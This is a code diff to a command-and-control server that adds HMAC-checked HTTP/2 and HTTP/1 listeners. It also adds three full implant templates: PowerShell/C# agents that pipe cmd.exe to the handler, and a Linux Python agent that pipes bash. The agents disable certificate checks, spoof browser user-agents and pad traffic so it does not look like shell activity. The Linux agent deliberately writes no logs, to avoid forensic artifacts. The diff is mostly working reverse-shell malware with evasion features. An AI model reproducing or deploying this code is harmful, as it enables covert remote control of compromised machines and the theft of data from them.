@@ -121,14 +121,20 @@ class Http2SessionSocket:
         self.close()
 
     def close(self):
-        if self.closed:
-            return
-        self.closed = True
-        try:
-            self.h2_conn.end_stream(self.stream_id)
-            self.tls_sock.sendall(self.h2_conn.data_to_send())
-        except Exception:
-            pass
+        # Take the same lock the sendall() path uses. close() mutates the
+        # shared H2Connection (end_stream + data_to_send), and hyper-h2 is
+        # not thread-safe — racing close() with a concurrent sendall()
+        # corrupts the HPACK state. The socketpair teardown is done
+        # outside the lock so we never block a plugin on fd cleanup.
+        with self.send_lock:
+            if self.closed:
+                return
+            self.closed = True
+            try:
+                self.h2_conn.end_stream(self.stream_id)
+                self.tls_sock.sendall(self.h2_conn.data_to_send())
+            except Exception:
+                pass
         for s in (self.rfd, self.wfd):
             try:
                 s.close()
@@ -204,6 +210,14 @@ class Http2Listener:
         ctx.options |= ssl.OP_NO_COMPRESSION
         ctx.options |= ssl.OP_NO_RENEGOTIATION
         ctx.options |= ssl.OP_CIPHER_SERVER_PREFERENCE
+        try:
+            ctx.options &= ~ssl.OP_NO_TICKET
+        except Exception:
+            pass
+        try:
+            ctx.num_tickets = 4
+        except Exception:
+            pass
         try:
             ctx.set_ecdh_curve("X25519")
         except ssl.SSLError:
@@ -303,9 +317,42 @@ class Http2Listener:
                             path   = hdrs.get(':path', '/')
                             method = hdrs.get(':method', 'GET')
 
+                            # Path is /c2/<token>?s=<hmac>. Strip the query
+                            # first, then split the path. Verify the HMAC
+                            # before dispatching to the handler — this
+                            # prevents token enumeration from hijacking an
+                            # existing session's stream.
+                            from urllib.parse import urlsplit as _us
+                            parts = _us(path)
                             token = None
-                            if method == 'POST' and path.startswith('/c2/'):
-                                token = path[4:].strip('/')
+                            presented = ''
+                            if method == 'POST' and parts.path.startswith('/c2/'):
+                                token = parts.path[4:].strip('/')
+                                for kv in (parts.query or '').split('&'):
+                                    if kv.startswith('s='):
+                                        presented = kv[2:]
+                                        break
+                            # Reject tokens whose proof does not verify.
+                            # We already hold conn_lock here — do NOT
+                            # re-acquire it (deadlock) and do not
+                            # reference send_lock (undefined in this
+                            # scope). The trailing data_to_send() flush
+                            # at the end of the event loop will carry
+                            # the headers out.
+                            #
+                            # `continue` is critical: a second
+                            # send_headers() on an end_stream'd stream
+                            # raises StreamClosedError in hyper-h2, and
+                            # that exception would tear down the entire
+                            # connection (killing every other bridge on
+                            # it). Skip to the next event instead.
+                            if token and not self.handler._h2_verify_token(token, presented):
+                                conn.send_headers(
+                                    ev.stream_id,
+                                    [(b':status', b'404')],
+                                    end_stream=True,
+                                )
+                                continue
 
                             if token:
                                 bridge = Http2SessionSocket(
@@ -333,7 +380,14 @@ class Http2Listener:
                         elif isinstance(ev, h2.events.DataReceived):
                             bridge = bridges.get(ev.stream_id)
                             if bridge is not None:
-                                bridge.feed(ev.data)
+                                # Strip the null-byte padding the Linux
+                                # agent adds to short frames so the shell
+                                # receives only real command data.
+                                payload = ev.data
+                                if payload.endswith(b'\x00'):
+                                    payload = payload.rstrip(b'\x00')
+                                if payload:
+                                    bridge.feed(payload)
                             try:
                                 conn.acknowledge_received_data(
                                     ev.flow_controlled_length, ev.stream_id,
@@ -367,6 +421,12 @@ class Http2Listener:
 
                         elif isinstance(ev, h2.events.ConnectionTerminated):
                             return
+
+                        elif isinstance(ev, h2.events.PingReceived):
+                            try:
+                                conn.ping(ev.ping_data, ack=True)
+                            except Exception:
+                                pass
 
                     try:
                         out = conn.data_to_send()
@@ -548,11 +608,26 @@ def _handle_http1(self, tls_sock, addr):
             return
         method, path, _ = parts
 
-        if method != 'POST' or not path.startswith('/c2/'):
+        if method != 'POST':
             tls_sock.sendall(b'HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n')
             return
 
-        token = path[4:].strip('/')
+        from urllib.parse import urlsplit as _us
+        url = _us(path)
+        if not url.path.startswith('/c2/'):
+            tls_sock.sendall(b'HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n')
+            return
+
+        token = url.path[4:].strip('/')
+        presented = ''
+        for kv in (url.query or '').split('&'):
+            if kv.startswith('s='):
+                presented = kv[2:]
+                break
+
+        if not self.handler._h2_verify_token(token, presented):
+            tls_sock.sendall(b'HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n')
+            return
         send_lock = threading.Lock()
         bridge = Http1SessionSocket(tls_sock, addr, send_lock)
 
@@ -576,3 +651,703 @@ def _handle_http1(self, tls_sock, addr):
 
 
 Http2Listener._handle_http1 = _handle_http1
+
+HTTP2_AGENT_TEMPLATE = r'''
+$ErrorActionPreference = 'SilentlyContinue'
+$Url = '__H2_URL__'
+$KillDeadline = __H2_KILL__
+
+$__agent_code = @'
+$ErrorActionPreference = 'Stop'
+$KillDeadline = __H2_KILL__
+Add-Type -TypeDefinition @"
+using System;
+using System.IO;
+using System.Net;
+using System.Net.Http;
+using System.Threading.Tasks;
+
+public static class H2Pipe {
+    public class BlockingStream : Stream {
+        private readonly System.Collections.Concurrent.BlockingCollection<byte[]> _q
+            = new System.Collections.Concurrent.BlockingCollection<byte[]>();
+        private byte[] _cur; private int _pos;
+        public override bool CanRead => true;
+        public override bool CanSeek => false;
+        public override bool CanWrite => true;
+        public override long Length => throw new NotSupportedException();
+        public override long Position { get => 0; set => throw new NotSupportedException(); }
+        public override void Flush() { }
+        public override long Seek(long o, SeekOrigin s) => throw new NotSupportedException();
+        public override void SetLength(long v) => throw new NotSupportedException();
+        public override int Read(byte[] buf, int off, int len) {
+            if (_cur == null || _pos >= _cur.Length) { _cur = _q.Take(); _pos = 0; }
+            int n = Math.Min(len, _cur.Length - _pos);
+            Array.Copy(_cur, _pos, buf, off, n);
+            _pos += n;
+            return n;
+        }
+        public override void Write(byte[] buf, int off, int len) {
+            byte[] c = new byte[len];
+            Array.Copy(buf, off, c, 0, len);
+            _q.Add(c);
+        }
+    }
+
+    public static async Task Run(string url) {
+        var handler = new HttpClientHandler {
+            ServerCertificateCustomValidationCallback = (m, c, ch, e) => true,
+        };
+        using var client = new HttpClient(handler) {
+            DefaultRequestVersion = HttpVersion.Version20,
+            DefaultVersionPolicy  = HttpVersionPolicy.RequestVersionExact,
+            Timeout = System.Threading.Timeout.InfiniteTimeSpan,
+        };
+        client.DefaultRequestHeaders.Add("User-Agent",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
+            "(KHTML, like Gecko) Chrome/120.0 Safari/537.36");
+
+        var up = new BlockingStream();
+        var content = new StreamContent(up);
+        var request = new HttpRequestMessage(HttpMethod.Post, url) { Content = content };
+        var response = await client.SendAsync(
+            request, HttpCompletionOption.ResponseHeadersRead);
+        response.EnsureSuccessStatusCode();
+        var down = await response.Content.ReadAsStreamAsync();
+
+        var psi = new System.Diagnostics.ProcessStartInfo {
+            FileName = "cmd.exe",
+            UseShellExecute = false,
+            RedirectStandardInput  = true,
+            RedirectStandardOutput = true,
+            RedirectStandardError  = true,
+            CreateNoWindow = true,
+        };
+        var proc = System.Diagnostics.Process.Start(psi);
+
+        var t1 = Task.Run(async () => {
+            var buf = new byte[4096]; int n;
+            while ((n = await down.ReadAsync(buf, 0, buf.Length)) > 0) {
+                await proc.StandardInput.BaseStream.WriteAsync(buf, 0, n);
+                await proc.StandardInput.BaseStream.FlushAsync();
+            }
+        });
+        var t2 = Task.Run(async () => {
+            var buf = new byte[4096]; int n;
+            while ((n = await proc.StandardOutput.BaseStream.ReadAsync(buf, 0, buf.Length)) > 0)
+                up.Write(buf, 0, n);
+        });
+        var t3 = Task.Run(async () => {
+            var buf = new byte[4096]; int n;
+            while ((n = await proc.StandardError.BaseStream.ReadAsync(buf, 0, buf.Length)) > 0)
+                up.Write(buf, 0, n);
+        });
+        await Task.WhenAll(t1, t2, t3);
+    }
+}
+"@ -Language CSharp
+
+# Kill date enforcement — a background runspace terminates the agent
+# when the deadline passes. Independent of the shell's lifecycle.
+$killer = [PowerShell]::Create()
+[void]$killer.AddScript(@"
+while ((Get-Date -UFormat %s) -lt $KillDeadline) { Start-Sleep -Seconds 30 }
+Stop-Process -Id `$PID -Force -ErrorAction SilentlyContinue
+"@)
+[void]$killer.BeginInvoke()
+
+[H2Pipe]::Run('__H2_URL__').GetAwaiter().GetResult()
+'@
+
+# Launch the agent as a detached background job so the shell
+# returns to its prompt immediately.
+$__job = Start-Job -ScriptBlock ([ScriptBlock]::Create($__agent_code)) `
+    -ErrorAction SilentlyContinue
+
+if ($__job) {
+    Write-Output ('H2_LAUNCHED:' + $__job.Id)
+} else {
+    Write-Output 'H2_LAUNCH_FAILED'
+}
+'''
+
+HTTP2_AGENT_LINUX_PY = r'''
+import os, queue, random, signal, socket, ssl, struct, subprocess, sys, threading, time
+
+HOST = "__H2_HOST__"
+PORT = __H2_PORT__
+PATH = "__H2_PATH__"
+# Absolute epoch seconds. Past this point the agent terminates itself
+# unconditionally, whether or not the handler is reachable.
+KILL_DEADLINE = __H2_KILL__
+
+try:
+    signal.signal(signal.SIGPIPE, signal.SIG_IGN)
+except Exception:
+    pass
+
+MODE = "h2"
+try:
+    import h2.config, h2.connection, h2.events
+except ImportError:
+    try:
+        subprocess.run(
+            [sys.executable, "-m", "pip", "install", "--quiet", "--user", "h2"],
+            check=False, timeout=60,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        )
+        import h2.config, h2.connection, h2.events
+    except Exception:
+        MODE = "h1"
+
+
+def _spawn_shell():
+    return subprocess.Popen(
+        ["/bin/bash", "--noprofile", "--norc"],
+        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT, bufsize=0,
+        start_new_session=True,
+    )
+
+
+def _shutdown_socket(sock):
+    try:
+        sock.shutdown(socket.SHUT_RDWR)
+    except Exception:
+        pass
+    try:
+        sock.close()
+    except Exception:
+        pass
+
+
+def _log(reason):
+    # Intentionally a no-op. Nothing is written to disk — no /tmp log
+    # file, no forensic artifact. Every call site is preserved so the
+    # code stays readable.
+    pass
+
+
+# ------------------------------------------------------------------ h2 path
+
+def run_h2():
+    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
+    conn = h2.connection.H2Connection(config=cfg)
+
+    raw = socket.create_connection((HOST, PORT), timeout=30)
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        ctx.set_alpn_protocols(["h2"])
+    except Exception:
+        pass
+    sock = ctx.wrap_socket(raw, server_hostname=HOST)
+
+    try:
+        sock.settimeout(None)
+    except Exception:
+        pass
+    try:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    except Exception:
+        pass
+
+    conn.initiate_connection()
+    sock.sendall(conn.data_to_send())
+
+    sid = conn.get_next_available_stream_id()
+    conn.send_headers(sid, [
+        (":method", "POST"), (":path", PATH),
+        (":authority", HOST + ":" + str(PORT)), (":scheme", "https"),
+        ("content-type", "application/octet-stream"),
+        ("user-agent", "Mozilla/5.0 (X11; Linux x86_64)"),
+    ], end_stream=False)
+    sock.sendall(conn.data_to_send())
+
+    stop_evt      = threading.Event()
+    h2_lock       = threading.Lock()
+    last_pong     = [time.time()]
+
+    # Kill date enforcement. This is independent of the main loop —
+    # if the deadline passes, the agent exits cleanly regardless of
+    # what the main loop is doing.
+    def _kill_watch():
+        while not stop_evt.is_set():
+            remaining = KILL_DEADLINE - time.time()
+            if remaining <= 0:
+                _log("kill date reached — self-destruct")
+                try:
+                    _shutdown_socket(sock)
+                except Exception:
+                    pass
+                stop_evt.set()
+                return
+            stop_evt.wait(min(30.0, remaining))
+
+    threading.Thread(target=_kill_watch, daemon=True).start()
+
+    # HTTP/2 keepalive. Sends a PING every 30-45 s (jittered). If the
+    # server never responds, the agent terminates — matching the
+    # behaviour of real browser clients, which detect a dead HTTP/2
+    # connection on missing PING acks. PING frames are indistinguishable
+    # from Chrome/Firefox keepalive on the wire.
+    def _keepalive():
+        while not stop_evt.is_set():
+            stop_evt.wait(random.uniform(30.0, 45.0))
+            if stop_evt.is_set():
+                return
+            try:
+                with h2_lock:
+                    conn.ping(b"\x00" * 8)
+                    sock.sendall(conn.data_to_send())
+            except Exception:
+                return
+            # Terminate if we haven't seen a PING ack in 2× the interval.
+            if time.time() - last_pong[0] > 90.0:
+                _log("keepalive lost — self-destruct")
+                try:
+                    _shutdown_socket(sock)
+                except Exception:
+                    pass
+                stop_evt.set()
+                return
+
+    threading.Thread(target=_keepalive, daemon=True).start()
+    pending_out   = []
+    window_updated = threading.Event()
+
+    # ---- shell lifecycle: reader + writer threads share this state ------
+    shell_state      = {'proc': None}
+    shell_spawn_lock = threading.Lock()
+    stdin_q          = queue.Queue(maxsize=8192)
+
+    def _spawn_shell_locked():
+        proc = _spawn_shell()
+        shell_state['proc'] = proc
+        threading.Thread(
+            target=shell_reader, args=(proc,), daemon=True,
+        ).start()
+        return proc
+
+    def _ensure_shell():
+        with shell_spawn_lock:
+            proc = shell_state['proc']
+            if proc is None or proc.poll() is not None:
+                rc = None if proc is None else proc.poll()
+                _spawn_shell_locked()
+            return shell_state['proc']
+
+    def shell_writer():
+        """Drain stdin_q into the current shell. This is the ONLY place
+        that ever writes to shell stdin. If the write fails, respawn."""
+        while not stop_evt.is_set():
+            try:
+                data = stdin_q.get(timeout=0.5)
+            except queue.Empty:
+                continue
+            if data is None:
+                return
+            while not stop_evt.is_set():
+                proc = _ensure_shell()
+                try:
+                    proc.stdin.write(data)
+                    proc.stdin.flush()
+                    break
+                except Exception as e:
+                    with shell_spawn_lock:
+                        if shell_state['proc'] is proc:
+                            try:
+                                proc.terminate()
+                            except Exception:
+                                pass
+                            shell_state['proc'] = None
+                    time.sleep(0.2)
+
+    def _drain_out():
+        while pending_out and not stop_evt.is_set():
+            try:
+                window = conn.local_flow_control_window(sid)
+            except Exception as e:
+                stop_evt.set()
+                return
+            if window <= 0:
+                return
+            head    = pending_out[0]
+            to_send = min(len(head), window, conn.max_outbound_frame_size)
+            try:
+                # Pad short frames to a randomised size so that the
+                # wire pattern does not look like a shell echoing
+                # commands. Real browsers pad to TLS record boundaries;
+                # this mimics that behaviour at the HTTP/2 layer.
+                payload = head[:to_send]
+                if len(payload) < 512:
+                    target = random.choice((512, 1024, 2048, 4096))
+                    if len(payload) < target:
+                        payload = payload + b'\x00' * (target - len(payload))
+                conn.send_data(sid, payload, end_stream=False)
+                sock.sendall(conn.data_to_send())
+            except Exception as e:
+                _log("send_data exception: %r" % (e,))
+                stop_evt.set()
+                return
+            if to_send >= len(head):
+                pending_out.pop(0)
+            else:
+                pending_out[0] = head[to_send:]
+
+    def shell_reader(proc):
+        """Read from ONE shell's stdout. Returns on EOF; the writer will
+        respawn (and start a new reader) when the next command arrives."""
+        try:
+            while not stop_evt.is_set():
+                try:
+                    data = os.read(proc.stdout.fileno(), 4096)
+                except Exception as e:
+                    return
+                if not data:
+                    return
+                with h2_lock:
+                    pending_out.append(data)
+                    _drain_out()
+                    has_more = bool(pending_out)
+                while has_more and not stop_evt.is_set():
+                    window_updated.wait(timeout=1.0)
+                    window_updated.clear()
+                    with h2_lock:
+                        _drain_out()
+                        has_more = bool(pending_out)
+        except Exception as e:
+            _log("shell_reader fatal: %r" % (e,))
+
+    # Bootstrap the first shell + writer thread.
+    with shell_spawn_lock:
+        _spawn_shell_locked()
+    threading.Thread(target=shell_writer, daemon=True).start()
+
+    try:
+        while not stop_evt.is_set():
+            try:
+                data = sock.recv(65536)
+            except Exception as e:
+                break
+            if not data:
+                break
+
+            with h2_lock:
+                try:
+                    events = conn.receive_data(data)
+                except Exception as e:
+                    break
+                got_window_update = False
+                for ev in events:
+                    if isinstance(ev, h2.events.DataReceived):
+                        # NEVER touch shell.stdin from this thread.
+                        try:
+                            stdin_q.put_nowait(ev.data)
+                        except queue.Full:
+                            _log("stdin_q full — dropping %d bytes" % len(ev.data))
+                        try:
+                            conn.acknowledge_received_data(
+                                ev.flow_controlled_length, ev.stream_id)
+                        except Exception:
+                            pass
+                    elif isinstance(ev, h2.events.WindowUpdated):
+                        if ev.stream_id in (0, sid):
+                            got_window_update = True
+                    elif isinstance(ev, h2.events.PingAckReceived):
+                        last_pong[0] = time.time()
+                    elif isinstance(ev, h2.events.PingReceived):
+                        # Respond to peer pings.
+                        try:
+                            conn.ping(ev.ping_data, ack=True)
+                        except Exception:
+                            pass
+                    elif isinstance(ev, (h2.events.StreamEnded,
+                                         h2.events.StreamReset)):
+                        _log("stream ended/reset — event=%s" % type(ev).__name__)
+                        stop_evt.set()
+                        break
+                    elif isinstance(ev, h2.events.ConnectionTerminated):
+                        stop_evt.set()
+                        break
+
+                try:
+                    out = conn.data_to_send()
+                    if out:
+                        sock.sendall(out)
+                except Exception:
+                    stop_evt.set()
+                    break
+
+                if got_window_update:
+                    _drain_out()
+
+            if got_window_update:
+                window_updated.set()
+    finally:
+        stop_evt.set()
+        window_updated.set()
+        try:
+            stdin_q.put_nowait(None)
+        except Exception:
+            pass
+        with shell_spawn_lock:
+            proc = shell_state['proc']
+        if proc is not None:
+            try:
+                proc.terminate()
+            except Exception:
+                pass
+        try:
+            with h2_lock:
+                conn.end_stream(sid)
+                sock.sendall(conn.data_to_send())
+        except Exception:
+            pass
+        _shutdown_socket(sock)
+
+
+# ------------------------------------------------------------------ h1 path
+
+def run_h1():
+    raw = socket.create_connection((HOST, PORT), timeout=30)
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        ctx.set_alpn_protocols(["http/1.1"])
+    except Exception:
+        pass
+    sock = ctx.wrap_socket(raw, server_hostname=HOST)
+    try:
+        sock.settimeout(None)
+    except Exception:
+        pass
+    try:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    except Exception:
+        pass
+
+    sock.sendall((
+        f"POST {PATH} HTTP/1.1\r\n"
+        f"Host: {HOST}:{PORT}\r\n"
+        f"Content-Type: application/octet-stream\r\n"
+        f"Transfer-Encoding: chunked\r\n"
+        f"Connection: keep-alive\r\n\r\n"
+    ).encode())
+
+    buf = b""
+    while b"\r\n\r\n" not in buf:
+        d = sock.recv(4096)
+        if not d:
+            return
+        buf += d
+    head_end = buf.find(b"\r\n\r\n")
+    rest = buf[head_end + 4:]
+
+    shell = _spawn_shell()
+    send_lock = threading.Lock()
+    stop_evt = threading.Event()
+
+    def shell_reader(shell_ref):
+        try:
+            while not stop_evt.is_set():
+                try:
+                    data = os.read(shell_ref.stdout.fileno(), 4096)
+                except Exception:
+                    data = b""
+                if not data:
+                    return
+                with send_lock:
+                    try:
+                        chunk = f"{len(data):x}\r\n".encode() + data + b"\r\n"
+                        sock.sendall(chunk)
+                    except Exception:
+                        stop_evt.set()
+                        _shutdown_socket(sock)
+                        return
+        except Exception:
+            return
+
+    threading.Thread(target=shell_reader, args=(shell,), daemon=True).start()
+
+    rbuf = bytearray(rest)
+
+    def _recv_more():
+        try:
+            d = sock.recv(65536)
+        except Exception:
+            return False
+        if not d:
+            return False
+        rbuf.extend(d)
+        return True
+
+    try:
+        while not stop_evt.is_set():
+            nl = rbuf.find(b"\r\n")
+            while nl < 0:
+                if not _recv_more():
+                    stop_evt.set()
+                    return
+                nl = rbuf.find(b"\r\n")
+            size_hex = bytes(rbuf[:nl]).split(b";")[0].strip()
+            del rbuf[:nl + 2]
+            try:
+                size = int(size_hex, 16)
+            except ValueError:
+                stop_evt.set()
+                return
+            if size == 0:
+                stop_evt.set()
+                return
+            while len(rbuf) < size + 2:
+                if not _recv_more():
+                    stop_evt.set()
+                    return
+            payload = bytes(rbuf[:size])
+            del rbuf[:size + 2]
+            try:
+                shell.stdin.write(payload)
+                shell.stdin.flush()
+            except Exception:
+                try:
+                    shell.terminate()
+                except Exception:
+                    pass
+                shell = _spawn_shell()
+                threading.Thread(
+                    target=shell_reader,
+                    args=(shell,), daemon=True,
+                ).start()
+    finally:
+        stop_evt.set()
+        try:
+            shell.terminate()
+        except Exception:
+            pass
+        _shutdown_socket(sock)
+
+
+if __name__ == "__main__":
+    try:
+        if MODE == "h2":
+            run_h2()
+        else:
+            run_h1()
+    except Exception:
+        try:
+            if MODE == "h2":
+                run_h1()
+        except Exception:
+            pass
+'''
+
+HTTP1_AGENT_PS = r'''
+$ErrorActionPreference = 'SilentlyContinue'
+$Url = '__H1_URL__'
+
+$__agent_code = @'
+$ErrorActionPreference = 'Stop'
+
+try {
+  [System.Net.ServicePointManager]::SecurityProtocol = `
+    [System.Net.SecurityProtocolType]::Tls12
+} catch {}
+try {
+  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = `
+    { param($s,$c,$ch,$e) $true }
+} catch {}
+
+Add-Type -TypeDefinition @"
+using System;
+using System.IO;
+using System.Net;
+using System.Threading;
+using System.Threading.Tasks;
+
+public static class Http1Shell {
+    public static void Run(string url) {
+        var req = (HttpWebRequest)WebRequest.Create(url);
+        req.Method = "POST";
+        req.ContentType = "application/octet-stream";
+        req.SendChunked = true;
+        req.AllowWriteStreamBuffering = false;
+        req.Timeout = Timeout.Infinite;
+        req.ReadWriteTimeout = Timeout.Infinite;
+        req.Proxy = null;
+        req.KeepAlive = true;
+
+        Stream reqStream = req.GetRequestStream();
+        IAsyncResult asyncResp = req.BeginGetResponse(null, null);
+
+        var psi = new System.Diagnostics.ProcessStartInfo {
+            FileName = "cmd.exe",
+            UseShellExecute = false,
+            RedirectStandardInput  = true,
+            RedirectStandardOutput = true,
+            RedirectStandardError  = true,
+            CreateNoWindow = true,
+        };
+        var proc = System.Diagnostics.Process.Start(psi);
+
+        object writeLock = new object();
+
+        var tA = Task.Run(() => {
+            try {
+                while (!asyncResp.IsCompleted) Thread.Sleep(20);
+                var resp = (HttpWebResponse)req.EndGetResponse(asyncResp);
+                Stream rs = resp.GetResponseStream();
+                byte[] buf = new byte[4096];
+                int n;
+                while ((n = rs.Read(buf, 0, buf.Length)) > 0) {
+                    proc.StandardInput.BaseStream.Write(buf, 0, n);
+                    proc.StandardInput.BaseStream.Flush();
+                }
+            } catch {}
+        });
+
+        var tB = Task.Run(() => {
+            try {
+                byte[] buf = new byte[4096];
+                int n;
+                while ((n = proc.StandardOutput.BaseStream.Read(buf, 0, buf.Length)) > 0) {
+                    lock (writeLock) {
+                        reqStream.Write(buf, 0, n);
+                        reqStream.Flush();
+                    }
+                }
+            } catch {}
+        });
+
+        var tC = Task.Run(() => {
+            try {
+                byte[] buf = new byte[4096];
+                int n;
+                while ((n = proc.StandardError.BaseStream.Read(buf, 0, buf.Length)) > 0) {
+                    lock (writeLock) {
+                        reqStream.Write(buf, 0, n);
+                        reqStream.Flush();
+                    }
+                }
+            } catch {}
+        });
+
+        Task.WaitAll(tA, tB, tC);
+    }
+}
+"@ -Language CSharp
+
+[Http1Shell]::Run('__H1_URL__')
+'@
+
+$__job = Start-Job -ScriptBlock ([ScriptBlock]::Create($__agent_code)) `
+    -ErrorAction SilentlyContinue
+
+if ($__job) {
+    Write-Output ('H2_LAUNCHED:' + $__job.Id)
+} else {
+    Write-Output 'H2_LAUNCH_FAILED'
+}
+'''
